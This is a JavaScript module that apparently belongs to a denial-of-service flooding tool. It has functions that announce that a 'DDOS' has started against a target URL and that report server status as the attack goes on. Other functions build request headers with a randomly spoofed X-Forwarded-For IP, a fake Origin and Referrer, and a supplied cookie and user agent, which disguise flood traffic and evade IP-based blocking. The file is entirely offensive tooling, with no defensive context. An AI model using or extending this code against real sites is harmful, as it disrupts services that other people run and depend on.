import randomstring from 'randomstring'

const generateByte = () => Math.round(Math.random() * 256)

const generateString = () => randomstring.generate({
  length: 10,
  charset: 'abcdefghijklmnopqstuvwxyz0123456789'
})

const generateIP = () => `${generateByte()}.${generateByte()}.${generateByte()}.${generateByte()}`

export const success = (url, delay) => {
  console.log('\x1b[34m%s\x1b[0m', `DDOS [ url: ${url} delay: ${delay / 1000}sec ]`)
  console.log('\x1b[33m%s\x1b[0m', `has been started successfully`)
}

export const printStatus = (statusCode) => {
  statusCode < 400
  ? console.log('\x1b[32m%s\x1b[0m', 'attack')
  : statusCode < 500
    ? console.log('\x1b[33m%s\x1b[0m', 'the server responded with an error')
    : console.log('\x1b[35m%s\x1b[0m', 'the server is not responding')
}

export const generateOptions = (url, useragent, cookie) => {
  const instance = generateString()
  const ip = generateIP()

  const headers = {
    Cookie: cookie,
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*!/!*;q=0.8',
    Origin: `http://${instance}.com`,
    Referrer: `http://google.com/${instance}`,
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': useragent,
    'X-Forwarded-For': ip
  }

  return { url, headers }
}
